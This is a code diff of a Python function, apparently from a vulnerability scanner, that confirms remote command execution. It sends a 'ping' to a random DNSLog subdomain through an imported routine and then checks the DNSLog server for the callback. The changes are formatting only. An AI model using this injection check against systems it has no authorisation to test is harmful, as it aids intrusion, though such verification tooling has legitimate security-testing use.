@@ -7,10 +7,7 @@ import string
 from module.scripts import scripts
 
 
-def verify(url, dnslog_url='{randstr}',
-           check_dnslog_url='{randstr}',
-           dns_log_flag='', mode='fast'):
-    # 增加可选的验证功能，使用DNSLog验证，方便批量验证。
+def verify(url, dnslog_url='{randstr}', check_dnslog_url='{randstr}', dns_log_flag='', mode='fast'):
     randstr = ''.join(random.sample(string.ascii_letters, 8))
     if '{randstr}' in check_dnslog_url:
         check_dnslog_url = check_dnslog_url.format(randstr=randstr)
@@ -18,8 +15,8 @@ def verify(url, dnslog_url='{randstr}',
         dnslog_url = dnslog_url.format(randstr=randstr)
     dnslog_command = "ping {dnslog_url}".format(dnslog_url=dnslog_url)
     scripts(url, dnslog_command, mode)
-    print('DNSLOG: {}'.format(dnslog_url))
-    print('CHECK DNSlog: {}'.format(check_dnslog_url))
+    print('[*] DNSLOG: {}'.format(dnslog_url))
+    print('[*] CHECK DNSlog: {}'.format(check_dnslog_url))
     try:
         resp = requests.get(check_dnslog_url)
         if dns_log_flag in resp.text:
